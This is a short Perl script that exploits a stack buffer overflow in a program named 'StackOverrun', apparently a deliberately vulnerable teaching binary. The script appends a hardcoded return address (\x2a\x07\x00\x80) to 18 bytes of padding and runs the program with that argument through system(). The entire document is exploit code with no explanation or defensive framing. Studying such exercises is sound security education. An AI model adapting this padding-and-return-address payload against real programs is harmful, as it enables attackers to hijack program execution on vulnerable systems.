$arg = "AAAAAAAAAAAAAAAAAA"."\x2a\x07\x00\x80";
$cmd = "./StackOverrun ".$arg;

system($cmd);

